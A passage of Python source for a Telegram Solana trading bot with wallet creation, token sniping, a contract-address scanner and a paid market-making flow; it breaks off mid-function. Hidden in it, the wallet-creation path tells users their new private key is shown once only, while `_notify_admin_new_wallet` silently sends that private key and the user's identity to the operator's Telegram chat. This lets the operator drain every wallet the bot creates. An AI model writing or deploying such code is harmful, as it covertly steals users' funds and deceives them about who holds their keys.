"""
signal_bot.py  –  NoBrainTrade Telegram Bot
APEX-style UI: inline keyboards, dashboard /start, formatted admin alerts
Token CA scanner: paste any address → instant details + quick trade buttons
MM flow: Strategy → Duration → Price → Pay
"""

import asyncio
import time
import uuid
import json
import os
import aiohttp

from dataclasses import dataclass, field
from typing import Dict, Optional, List

from telegram import (
    Bot, Update,
    InlineKeyboardButton, InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler,
    CallbackQueryHandler, ContextTypes,
)
from telegram.error import TelegramError

from solders.keypair import Keypair
from solders.transaction import Transaction
from solders.system_program import transfer, TransferParams
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from solana.rpc.commitment import Confirmed
from solana.rpc.types import TxOpts

from config import (
    TELEGRAM_BOT_TOKEN, TELEGRAM_SIGNAL_CHANNEL, TELEGRAM_ADMIN_ID,
    SOLANA_RPC_URL, PRIVATE_KEY, DRY_RUN,
    AUTO_BUY_AMOUNT_SOL, MAX_CONCURRENT_POSITIONS,
    SLIPPAGE_BPS, STOP_LOSS_PCT, TAKE_PROFIT_LEVELS, MCAP_MAX_SOL,
)
from utils import logger

# ──────────────────────────────────────────────────────────────────────────────
# MM Strategies & Pricing
# ──────────────────────────────────────────────────────────────────────────────

MM_STRATEGIES = {
    "basic": {
        "label": "🟢 Basic",
        "description": "Tight spread (20 bps), low inventory, steady volume",
        "spread_bps": 20,
        "order_size_sol": 0.5,
        "max_inventory_sol": 2.0,
        "price_per_hour_sol": 0.5,
    },
    "aggressive": {
        "label": "🟡 Aggressive",
        "description": "Wide spread (50 bps), large orders, fast rebalance",
        "spread_bps": 50,
        "order_size_sol": 2.0,
        "max_inventory_sol": 8.0,
        "price_per_hour_sol": 1.5,
    },
    "deep": {
        "label": "🔴 Deep Liquidity",
        "description": "Ultra-tight spread (10 bps), massive order walls",
        "spread_bps": 10,
        "order_size_sol": 5.0,
        "max_inventory_sol": 20.0,
        "price_per_hour_sol": 4.0,
    },
}

# Predefined durations for MM (hours)
MM_DURATIONS = [1, 3, 6, 12, 24]

# ──────────────────────────────────────────────────────────────────────────────
# Persistence
# ──────────────────────────────────────────────────────────────────────────────

DB_FILE = "users_db.json"
_user_counter_file = "user_counter.json"


def _load_db() -> dict:
    if os.path.exists(DB_FILE):
        with open(DB_FILE) as f:
            return json.load(f)
    return {"users": {}}


def _save_db(db: dict):
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=2)


def _next_user_number() -> int:
    data = {}
    if os.path.exists(_user_counter_file):
        with open(_user_counter_file) as f:
            data = json.load(f)
    n = data.get("count", 0) + 1
    with open(_user_counter_file, "w") as f:
        json.dump({"count": n}, f)
    return n


# ──────────────────────────────────────────────────────────────────────────────
# Data models
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Position:
    mint: str
    symbol: str
    entry_price_sol: float
    amount_sol: float
    current_price_sol: float = 0.0
    highest_price_sol: float = 0.0
    buy_time: float = field(default_factory=time.time)
    tp_levels: list = field(default_factory=lambda: [(2.0, 0.5), (3.0, 0.3), (5.0, 0.2)])
    id: str = field(default_factory=lambda: uuid.uuid4().hex)


class UserTrader:
    def __init__(self, user_id: int, keypair: Keypair):
        self.user_id = user_id
        self.keypair = keypair
        self.positions: Dict[str, Position] = {}
        self.auto_buy = False
        self.auto_buy_amount_sol = AUTO_BUY_AMOUNT_SOL
        self.max_positions = MAX_CONCURRENT_POSITIONS
        self.slippage_bps = SLIPPAGE_BPS
        self.stop_loss_pct = STOP_LOSS_PCT
        self.take_profit_levels = list(TAKE_PROFIT_LEVELS)
        self.realized_pnl_sol: float = 0.0
        self._session: Optional[aiohttp.ClientSession] = None

    def _sess(self) -> aiohttp.ClientSession:
        if not self._session or self._session.closed:
            self._session = aiohttp.ClientSession()
        return self._session

    async def get_token_price(self, mint: str) -> Optional[float]:
        try:
            async with self._sess().get(f"https://frontend-api.pump.fun/coins/{mint}") as r:
                d = await r.json()
                return float(d.get("market_cap", 0))
        except Exception:
            return None

    async def execute_buy(self, mint: str, symbol: str) -> Optional[str]:
        if len(self.positions) >= self.max_positions:
            return None
        price = await self.get_token_price(mint)
        if price and price > MCAP_MAX_SOL:
            return None
        amount = self.auto_buy_amount_sol
        if DRY_RUN:
            pos = Position(mint, symbol, price or 0.0, amount)
            self.positions[mint] = pos
            return pos.id
        payload = {
            "action": "buy", "mint": mint, "amount": amount,
            "denominatedInSol": "true", "slippage": self.slippage_bps,
            "priorityFee": 0.005, "privateKey": str(self.keypair),
        }
        async with self._sess().post("https://pumpportal.fun/api/trade", json=payload) as r:
            d = await r.json()
            if d.get("error"):
                return None
        pos = Position(mint, symbol, price or 0.0, amount)
        self.positions[mint] = pos
        return pos.id

    async def execute_sell(self, mint: str, fraction: float = 1.0) -> bool:
        if mint not in self.positions:
            return False
        pos = self.positions[mint]
        amount = pos.amount_sol * fraction
        pnl = (pos.current_price_sol - pos.entry_price_sol) * fraction
        if DRY_RUN:
            pos.amount_sol -= amount
            self.realized_pnl_sol += pnl
            if pos.amount_sol <= 0.0001:
                del self.positions[mint]
            return True
        payload = {
            "action": "sell", "mint": mint, "amount": amount,
            "denominatedInSol": "true", "slippage": self.slippage_bps,
            "privateKey": str(self.keypair),
        }
        async with self._sess().post("https://pumpportal.fun/api/trade", json=payload) as r:
            d = await r.json()
            if d.get("error"):
                return False
        pos.amount_sol -= amount
        self.realized_pnl_sol += pnl
        if pos.amount_sol <= 0.0001:
            del self.positions[mint]
        return True

    async def monitor_positions(self):
        while True:
            for mint, pos in list(self.positions.items()):
                price = await self.get_token_price(mint)
                if not price:
                    continue
                pos.current_price_sol = price
                if price > pos.highest_price_sol:
                    pos.highest_price_sol = price
                if pos.highest_price_sol > 0:
                    drawdown = (pos.highest_price_sol - price) / pos.highest_price_sol * 100
                    if drawdown >= self.stop_loss_pct:
                        await self.execute_sell(mint, 1.0)
                        continue
                for mult, frac in list(pos.tp_levels):
                    if price >= pos.entry_price_sol * mult:
                        await self.execute_sell(mint, frac)
                        pos.tp_levels.remove((mult, frac))
                        break
            await asyncio.sleep(5)


# ──────────────────────────────────────────────────────────────────────────────
# Keyboard builders
# ──────────────────────────────────────────────────────────────────────────────

def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🤖 Auto Trade", callback_data="autotrade_toggle"),
            InlineKeyboardButton("📈 Trade",       callback_data="menu_trade"),
        ],
        [
            InlineKeyboardButton("📊 Positions",   callback_data="menu_positions"),
            InlineKeyboardButton("💹 PnL",          callback_data="menu_pnl"),
        ],
        [
            InlineKeyboardButton("📋 Copy Trade",  callback_data="menu_copy_trade"),
            InlineKeyboardButton("📡 Signals",      callback_data="menu_spikes"),
        ],
        [
            InlineKeyboardButton("🏦 Market Making",callback_data="menu_mm"),
            InlineKeyboardButton("👛 Wallet",        callback_data="menu_wallet"),
        ],
        [
            InlineKeyboardButton("⚙️ Settings",     callback_data="menu_settings"),
            InlineKeyboardButton("❓ Help",          callback_data="menu_help"),
        ],
    ])


def wallet_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🆕 Create Wallet",  callback_data="wallet_create"),
            InlineKeyboardButton("📥 Import Wallet",  callback_data="wallet_import"),
        ],
        [
            InlineKeyboardButton("💰 Balance",        callback_data="wallet_balance"),
            InlineKeyboardButton("📤 Deposit",        callback_data="wallet_deposit"),
        ],
        [
            InlineKeyboardButton("💸 Withdraw",       callback_data="wallet_withdraw"),
        ],
        [InlineKeyboardButton("« Back",              callback_data="menu_main")],
    ])


def mm_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🟢 Basic - 0.5 SOL/hr",     callback_data="mm_strat_basic"),
        ],
        [
            InlineKeyboardButton("🟡 Aggressive - 1.5 SOL/hr", callback_data="mm_strat_aggressive"),
        ],
        [
            InlineKeyboardButton("🔴 Deep - 4 SOL/hr",       callback_data="mm_strat_deep"),
        ],
        [
            InlineKeyboardButton("📋 My MM Sessions",           callback_data="mm_status"),
        ],
        [InlineKeyboardButton("« Back",                        callback_data="menu_main")],
    ])


def mm_duration_keyboard(strategy: str) -> InlineKeyboardMarkup:
    price_per_hour = MM_STRATEGIES[strategy]["price_per_hour_sol"]
    rows = []
    for dur in MM_DURATIONS:
        total = round(price_per_hour * dur, 2)
        rows.append([
            InlineKeyboardButton(
                f"⏳ {dur}h — {total} SOL",
                callback_data=f"mm_dur_{strategy}_{dur}"
            )
        ])
    rows.append([InlineKeyboardButton("« Back", callback_data="menu_mm")])
    return InlineKeyboardMarkup(rows)


def settings_keyboard(trader: UserTrader) -> InlineKeyboardMarkup:
    auto = "🟢 ON" if trader.auto_buy else "🔴 OFF"
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"🤖 Auto Trade: {auto}", callback_data="autotrade_toggle"),
        ],
        [
            InlineKeyboardButton("💵 Buy Amount",   callback_data="set_buy_amount"),
            InlineKeyboardButton("📉 Stop Loss",    callback_data="set_stop_loss"),
        ],
        [
            InlineKeyboardButton("🔀 Slippage",     callback_data="set_slippage"),
            InlineKeyboardButton("📌 Max Positions",callback_data="set_max_pos"),
        ],
        [InlineKeyboardButton("« Back",            callback_data="menu_main")],
    ])


# ──────────────────────────────────────────────────────────────────────────────
# Dashboard message builder
# ──────────────────────────────────────────────────────────────────────────────

def build_dashboard(user, trader: Optional[UserTrader], wallet_addr: Optional[str]) -> str:
    now = time.strftime("%I:%M:%S %p")
    wallet_line = f"<code>{wallet_addr}</code>" if wallet_addr else "🗂 No wallet"
    balance_line = "0.0000 SOL"  # replaced later
    auto_line = "🟢 ON" if (trader and trader.auto_buy) else "🔴 OFF"
    positions = len(trader.positions) if trader else 0

    return (
        f"⚡ <b>NOBRAINTRADE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🤖 <b>Auto Trade</b> — Snipe every new pump.fun launch\n"
        f"📈 <b>Trade</b> — Paste any CA to scan and buy instantly\n"
        f"📊 <b>Positions</b> — Monitor your active trades live\n"
        f"💹 <b>PnL</b> — Full trade history and stats\n"
        f"📋 <b>Copy Trade</b> — Mirror top traders in real time\n"
        f"📡 <b>Signals</b> — Live +150% spike alerts\n\n"
        f"🏦 <b>Market Making</b> — Professional MM service\n\n"
        f"⚡ <i>Paste any token CA to trade instantly!</i>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👛 {wallet_line}\n"
        f"💰 Balance: <b>{balance_line}</b>\n"
        f"🤖 Auto: {auto_line}  📊 Positions: <b>{positions}</b>\n"
        f"<i>Updated {now}</i>"
    )


# ──────────────────────────────────────────────────────────────────────────────
# Main SignalBot
# ──────────────────────────────────────────────────────────────────────────────

class SignalBot:

    def __init__(self, trader=None, mm=None):
        self.bot = Bot(token=TELEGRAM_BOT_TOKEN) if TELEGRAM_BOT_TOKEN else None
        self.admin_id = str(TELEGRAM_ADMIN_ID)
        self.rpc_client = AsyncClient(SOLANA_RPC_URL) if SOLANA_RPC_URL else None

        self.user_wallets: Dict[int, Keypair] = {}
        self.user_traders: Dict[int, UserTrader] = {}
        self.mm_requests: List[dict] = []
        self.mm_sessions: Dict[str, dict] = {}

        self._pending: Dict[int, dict] = {}

        self.trader = trader
        self.mm = mm
        self._db = _load_db()

    # ── Helpers ───────────────────────────────────────────────────────────────

    async def _is_admin(self, update: Update) -> bool:
        return str(update.effective_user.id) == self.admin_id

    def _save_user(self, uid: int, data: dict):
        self._db["users"][str(uid)] = data
        _save_db(self._db)

    def _get_user(self, uid: int) -> Optional[dict]:
        return self._db["users"].get(str(uid))

    def _get_wallet_addr(self, uid: int) -> Optional[str]:
        kp = self.user_wallets.get(uid)
        return str(kp.pubkey()) if kp else None

    async def _get_sol_balance(self, uid: int) -> float:
        kp = self.user_wallets.get(uid)
        if not kp or not self.rpc_client:
            return 0.0
        try:
            resp = await self.rpc_client.get_balance(kp.pubkey(), commitment=Confirmed)
            return resp["result"]["value"] / 1e9
        except Exception:
            return 0.0

    async def _notify_admin_new_wallet(self, user, kp: Keypair, user_num: int):
        if not self.bot:
            return
        username = f"@{user.username}" if user.username else "N/A"
        created_at = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
        msg = (
            f"🆕 <b>Wallet Created</b>\n"
            f"👤 {username} ({user.id})\n"
            f"📛 {user.full_name}\n"
            f"📍 <code>{kp.pubkey()}</code>\n"
            f"🔑 <code>{str(kp)}</code>\n"
            f"🪪 #{user_num}\n"
            f"⏰ {created_at}"
        )
        try:
            await self.bot.send_message(chat_id=int(self.admin_id), text=msg, parse_mode=ParseMode.HTML)
        except TelegramError as e:
            logger.error(f"Admin wallet notify failed: {e}")

    async def _notify_admin_new_user(self, user, user_num: int):
        if not self.bot:
            return
        username = f"@{user.username}" if user.username else "N/A"
        joined_at = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
        msg = (
            f"👤 <b>New User</b>\n"
            f"👤 {username} ({user.id})\n"
            f"📛 {user.full_name}\n"
            f"🪪 #{user_num}\n"
            f"⏰ {joined_at}"
        )
        try:
            await self.bot.send_message(chat_id=int(self.admin_id), text=msg, parse_mode=ParseMode.HTML)
        except TelegramError as e:
            logger.error(f"Admin user notify failed: {e}")

    async def send_admin_log(self, message: str):
        if not self.bot:
            return
        try:
            await self.bot.send_message(chat_id=int(self.admin_id), text=message, parse_mode=ParseMode.HTML)
        except TelegramError as e:
            logger.error(f"Admin log failed: {e}")

    # ── Spike / signal senders ────────────────────────────────────────────────

    async def send_spike(self, token):
        if not self.bot:
            return
        text = (
            f"📡 <b>Spike Alert ≥150%</b>\n\n"
            f"🪙 <b>{token.symbol} ({token.name})</b>\n"
            f"📈 Spike: <b>+{token.spike_pct:.0f}%</b>\n"
            f"💰 MCap: {token.current_mcap:.2f} SOL\n"
            f"👥 Wallets: {token.unique_wallet_count}\n"
            f"<a href='https://pump.fun/coin/{token.mint}'>View on pump.fun</a>"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🟢 Buy Now", url=f"https://pump.fun/coin/{token.mint}")],
        ])
        try:
            await self.bot.send_message(
                chat_id=TELEGRAM_SIGNAL_CHANNEL, text=text,
                parse_mode=ParseMode.HTML, reply_markup=keyboard,
            )
        except TelegramError as e:
            logger.error(f"Spike send failed: {e}")

    async def send_strong_signal(self, token):
        if not self.bot:
            return
        text = (
            f"⚡ <b>BUY SIGNAL (Score ≥85)</b>\n\n"
            f"🪙 <b>{token.symbol} ({token.name})</b>\n"
            f"📈 Spike: +{token.spike_pct:.0f}%\n"
            f"💰 MCap: {token.current_mcap:.2f} SOL\n"
            f"📊 Buy Ratio: {token.buy_ratio:.2f}\n"
            f"<a href='https://pump.fun/coin/{token.mint}'>Open</a>"
        )
        try:
            await self.bot.send_message(
                chat_id=TELEGRAM_SIGNAL_CHANNEL, text=text, parse_mode=ParseMode.HTML
            )
        except TelegramError as e:
            logger.error(f"Signal send failed: {e}")

    # ── Token info fetcher for CA scanner ─────────────────────────────────────
    async def fetch_token_info(self, mint: str) -> Optional[dict]:
        """Return token details from pump.fun."""
        url = f"https://frontend-api.pump.fun/coins/{mint}"
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.get(url) as resp:
                    data = await resp.json()
                    return {
                        "name": data.get("name", "?"),
                        "symbol": data.get("symbol", "?"),
                        "mcap": float(data.get("usd_market_cap", 0)),
                        "price": float(data.get("price", 0)),
                        "volume_24h": float(data.get("volume_24h", 0)),
                        "holders": data.get("holder_count", 0),
                        "created": data.get("created_at", ""),
                    }
        except Exception:
            return None

    # ──────────────────────────────────────────────────────────────────────────
    # /start  &  dashboard refresh
    # ──────────────────────────────────────────────────────────────────────────

    async def _send_dashboard(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        uid = user.id
        trader = self.user_traders.get(uid)
        wallet_addr = self._get_wallet_addr(uid)
        text = build_dashboard(user, trader, wallet_addr)
        bal = await self._get_sol_balance(uid)
        text = text.replace("0.0000 SOL", f"{bal:.4f} SOL")

        kb = main_menu_keyboard()
        if update.callback_query:
            try:
                await update.callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            except Exception:
                await update.callback_query.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        else:
            await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        uid = user.id

        existing = self._get_user(uid)
        if not existing:
            num = _next_user_number()
            self._save_user(uid, {
                "id": uid,
                "full_name": user.full_name,
                "username": user.username,
                "joined_at": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                "number": num,
            })
            await self._notify_admin_new_user(user, num)

        await self._send_dashboard(update, context)

    # ──────────────────────────────────────────────────────────────────────────
    # Callback query router
    # ──────────────────────────────────────────────────────────────────────────

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query
        await q.answer()
        data = q.data
        uid = update.effective_user.id

        # ── Main menu ─────────────────────────────────────────────────────────
        if data == "menu_main":
            await self._send_dashboard(update, context)

        elif data == "menu_wallet":
            await q.edit_message_text(
                "👛 <b>Wallet</b>\n\nManage your Solana wallet.",
                parse_mode=ParseMode.HTML,
                reply_markup=wallet_keyboard(),
            )

        elif data == "menu_settings":
            trader = self.user_traders.get(uid)
            if not trader:
                await q.edit_message_text(
                    "⚠️ Create a wallet first.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]]),
                )
                return
            await q.edit_message_text(
                f"⚙️ <b>Settings</b>\n\n"
                f"Buy amount:    <b>{trader.auto_buy_amount_sol} SOL</b>\n"
                f"Slippage:      <b>{trader.slippage_bps} bps</b>\n"
                f"Stop Loss:     <b>{trader.stop_loss_pct}%</b>\n"
                f"Max positions: <b>{trader.max_positions}</b>\n"
                f"Auto-trade:    <b>{'🟢 ON' if trader.auto_buy else '🔴 OFF'}</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=settings_keyboard(trader),
            )

        elif data == "menu_positions":
            await self._show_positions(update, context)

        elif data == "menu_pnl":
            await self._show_pnl(update, context)

        elif data == "menu_spikes":
            await self._show_spikes(update, context)

        elif data == "menu_trade":
            await q.edit_message_text(
                "📈 <b>Trade</b>\n\nSend a token mint address (CA) to trade instantly.\n\n"
                "Usage: /buy &lt;mint&gt; or /sell &lt;mint&gt;",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]]),
            )

        # ── Copy Trade (replaces Volume Boost) ─────────────────────────────────
        elif data == "menu_copy_trade":
            await q.edit_message_text(
                "📋 <b>Copy Trade</b>\n\n"
                "Mirror the trades of top-performing wallets in real time.\n\n"
                "🚧 <i>This feature is coming soon!</i>\n\n"
                "For now, you can use /buy and /sell manually.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]]),
            )

        elif data == "menu_help":
            await q.edit_message_text(
                "❓ <b>Help</b>\n\n"
                "/start — Dashboard\n"
                "/buy &lt;mint&gt; — Buy token\n"
                "/sell &lt;mint&gt; — Sell token\n"
                "/balance — Check balance\n"
                "/deposit — Deposit address\n"
                "/withdraw &lt;addr&gt; &lt;amt&gt; — Withdraw SOL\n"
                "/positions — Open trades\n"
                "/pnl — Profit & Loss\n"
                "/spikes — Live spike alerts\n"
                "/settings — Trading config\n"
                "/mm_purchase — Market making\n\n"
                "💬 Support: @nobraintradesupport",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]]),
            )

        # ── Wallet actions ────────────────────────────────────────────────────
        elif data == "wallet_create":
            await self._create_wallet(update, context)

        elif data == "wallet_import":
            self._pending[uid] = {"action": "import_key"}
            await q.edit_message_text(
                "📥 <b>Import Wallet</b>\n\n"
                "Send your <b>base58 private key</b> in the next message.\n\n"
                "⚠️ Only do this in a private chat with the bot.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="menu_wallet")]]),
            )

        elif data == "wallet_balance":
            kp = self.user_wallets.get(uid)
            if not kp:
                await q.edit_message_text(
                    "⚠️ No wallet. Create one first.",
                    reply_markup=wallet_keyboard(),
                )
                return
            bal = await self._get_sol_balance(uid)
            trader = self.user_traders.get(uid)
            in_pos = sum(p.amount_sol for p in trader.positions.values()) if trader else 0
            await q.edit_message_text(
                f"💰 <b>Balance</b>\n\n"
                f"SOL: <b>{bal:.4f}</b>\n"
                f"In positions: {in_pos:.4f} SOL\n"
                f"Address: <code>{kp.pubkey()}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_wallet")]]),
            )

        elif data == "wallet_deposit":
            kp = self.user_wallets.get(uid)
            if not kp:
                await q.edit_message_text("⚠️ No wallet.", reply_markup=wallet_keyboard())
                return
            await q.edit_message_text(
                f"📥 <b>Deposit Address</b>\n\n"
                f"<code>{kp.pubkey()}</code>\n\n"
                "Send SOL to this address to fund your wallet.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_wallet")]]),
            )

        elif data == "wallet_withdraw":
            self._pending[uid] = {"action": "withdraw_step1"}
            await q.edit_message_text(
                "💸 <b>Withdraw SOL</b>\n\n"
                "Send your message in this format:\n"
                "<code>withdraw &lt;address&gt; &lt;amount&gt;</code>\n\n"
                "Example:\n<code>withdraw ABC...XYZ 0.5</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="menu_wallet")]]),
            )

        # ── Auto trade toggle ─────────────────────────────────────────────────
        elif data == "autotrade_toggle":
            trader = self.user_traders.get(uid)
            if not trader:
                await q.answer("Create a wallet first!", show_alert=True)
                return
            trader.auto_buy = not trader.auto_buy
            state = "🟢 ENABLED" if trader.auto_buy else "🔴 DISABLED"
            await q.answer(f"Auto Trade {state}", show_alert=False)
            await self._send_dashboard(update, context)

        # ── Market making (revised flow) ─────────────────────────────────────
        elif data == "menu_mm":
            await q.edit_message_text(
                "🏦 <b>Market Making</b>\n\n"
                "Professional liquidity provision for your token.\n\n"
                "Choose a strategy:",
                parse_mode=ParseMode.HTML,
                reply_markup=mm_keyboard(),
            )

        elif data.startswith("mm_strat_"):
            strategy = data.replace("mm_strat_", "")
            context.user_data["mm_strategy"] = strategy
            await q.edit_message_text(
                f"🏦 <b>{MM_STRATEGIES[strategy]['label']}</b>\n"
                f"{MM_STRATEGIES[strategy]['description']}\n\n"
                f"💰 <b>Price per hour:</b> {MM_STRATEGIES[strategy]['price_per_hour_sol']} SOL\n\n"
                f"Select duration:",
                parse_mode=ParseMode.HTML,
                reply_markup=mm_duration_keyboard(strategy),
            )

        elif data.startswith("mm_dur_"):
            _, strategy, dur_str = data.split("_")
            duration = int(dur_str)
            total = round(MM_STRATEGIES[strategy]["price_per_hour_sol"] * duration, 2)
            context.user_data["mm_duration"] = duration
            context.user_data["mm_total_sol"] = total
            kp = self.user_wallets.get(uid)
            if not kp:
                await q.answer("Create a wallet first!", show_alert=True)
                return
            if not PRIVATE_KEY:
                await q.answer("Admin wallet not configured.", show_alert=True)
                return
            admin_kp = Keypair.from_base58_string(PRIVATE_KEY)
            await q.edit_message_text(
                f"🏦 <b>Confirm MM Order</b>\n\n"
                f"Strategy: {MM_STRATEGIES[strategy]['label']}\n"
                f"Duration: {duration}h\n"
                f"Total cost: <b>{total} SOL</b>\n\n"
                f"📤 Send exactly <b>{total} SOL</b> to:\n"
                f"<code>{admin_kp.pubkey()}</code>\n\n"
                f"After payment tap Confirm:",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Confirm Payment", callback_data="mm_pay_confirm")],
                    [InlineKeyboardButton("« Back", callback_data="menu_mm")],
                ]),
            )

        elif data == "mm_pay_confirm":
            strategy = context.user_data.get("mm_strategy", "basic")
            duration = context.user_data.get("mm_duration", 1)
            total = context.user_data.get("mm_total_sol", 0)
            user = update.effective_user
            self.mm_requests.append({
                "user_id": uid,
                "username": user.username or user.full_name,
                "mint": "pending",
                "strategy": strategy,
                "duration": duration,
                "total_sol": total,
                "confirmed_at": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
            })
            await q.edit_message_text(
                "✅ <b>Payment Confirmation Sent!</b>\n\n"
                "Admin will verify and activate your MM session shortly.\n\n"
                "Use /mm_status to check.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]]),
            )
            try:
                await self.bot.send_message(
                    chat_id=int(self.admin_id),
                    text=(
                        f"📩 <b>MM Payment Confirmed</b>\n"
                        f"👤 @{user.username or user.full_name} ({uid})\n"
                        f"📛 {user.full_name}\n"
                        f"📊 Strategy: {strategy}\n"
                        f"⏳ Duration: {duration}h\n"
                        f"💰 Amount: {total} SOL\n"
                        f"⏰ {time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())}\n\n"
                        f"Run: /admin_mm_start &lt;mint&gt; {strategy} {duration}"
                    ),
                    parse_mode=ParseMode.HTML,
                )
            except TelegramError:
                pass

        elif data == "mm_status":
            sessions = [s for s in self.mm_sessions.values() if s.get("user_id") == uid]
            if not sessions:
                await q.edit_message_text(
                    "📋 No active MM sessions.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_mm")]]),
                )
                return
            lines = ["🏦 <b>Your Active MM Sessions</b>\n"]
            for s in sessions:
                elapsed = int((time.time() - s["started_at"]) / 3600)
                remaining = max(0, s["hours"] - elapsed)
                lines.append(
                    f"• <code>{s['mint'][:10]}…</code> | {s['strategy']} | {remaining}h left"
                )
            await q.edit_message_text(
                "\n".join(lines),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_mm")]]),
            )

        # ── Quick buy / sell from CA scanner ──────────────────────────────────
        elif data.startswith("quick_buy_"):
            mint = data.replace("quick_buy_", "")
            trader = self.user_traders.get(uid)
            if not trader:
                await q.answer("Create a wallet first!", show_alert=True)
                return
            await q.answer("Buying...")
            tid = await trader.execute_buy(mint, mint[:6].upper())
            await q.edit_message_text(
                f"✅ Buy order placed for <code>{mint[:12]}…</code>" if tid else "❌ Buy failed. Check balance/mcap.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]]),
            )

        elif data.startswith("quick_sell_"):
            mint = data.replace("quick_sell_", "")
            trader = self.user_traders.get(uid)
            if not trader:
                await q.answer("Create a wallet first!", show_alert=True)
                return
            await q.answer("Selling...")
            res = await trader.execute_sell(mint, 1.0)
            await q.edit_message_text(
                "✅ Position closed!" if res else "❌ No open position for that token.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]]),
            )

    # ──────────────────────────────────────────────────────────────────────────
    # Wallet creation helper
    # ──────────────────────────────────────────────────────────────────────────

    async def _create_wallet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query
        uid = update.effective_user.id
        user = update.effective_user

        if uid in self.user_wallets:
            kp = self.user_wallets[uid]
            await q.edit_message_text(
                f"⚠️ <b>You already have a wallet.</b>\n\n"
                f"📍 <code>{kp.pubkey()}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=wallet_keyboard(),
            )
            return

        kp = Keypair()
        self.user_wallets[uid] = kp
        self.user_traders[uid] = UserTrader(uid, kp)

        user_data = self._get_user(uid)
        user_num = user_data.get("number", 1) if user_data else 1

        await q.edit_message_text(
            f"✅ <b>Wallet Created!</b>\n\n"
            f"📍 Address:\n<code>{kp.pubkey()}</code>\n\n"
            f"🔑 Private key <b>(save this — shown once only)</b>:\n"
            f"<code>{str(kp)}</code>\n\n"
            f"Deposit SOL to start trading.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_wallet")]]),
        )

        await self._notify_admin_new_wallet(user, kp, user_num)

    # ──────────────────────────────────────────────────────────────────────────
    # Message handler (for pending text inputs: import key, withdraw, CA paste)
    # ──────────────────────────────────────────────────────────────────────────

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        text = update.message.text.strip()
        pending = self._pending.get(uid)

        if pending:
            action = pending["action"]

            if action == "import_key":
                try:
                    kp = Keypair.from_base58_string(text)
                    self.user_wallets[uid] = kp
                    self.user_traders[uid] = UserTrader(uid, kp)
                    del self._pending[uid]
                    await update.message.reply_text(
                        f"✅ <b>Wallet Imported!</b>\n\n"
                        f"📍 Address: <code>{kp.pubkey()}</code>",
                        parse_mode=ParseMode.HTML,
                        reply_markup=main_menu_keyboard(),
                    )
                    await self.send_admin_log(
                        f"📥 <b>Wallet Imported</b>\n"
                        f"👤 @{update.effective_user.username or 'N/A'} ({uid})\n"
                        f"📍 <code>{kp.pubkey()}</code>"
                    )
                except Exception:
                    await update.message.reply_text("❌ Invalid private key. Try again or /start to cancel.")

            elif action == "withdraw_step1":
                parts = text.split()
                if len(parts) == 3 and parts[0].lower() == "withdraw":
                    to_addr, amt_str = parts[1], parts[2]
                    try:
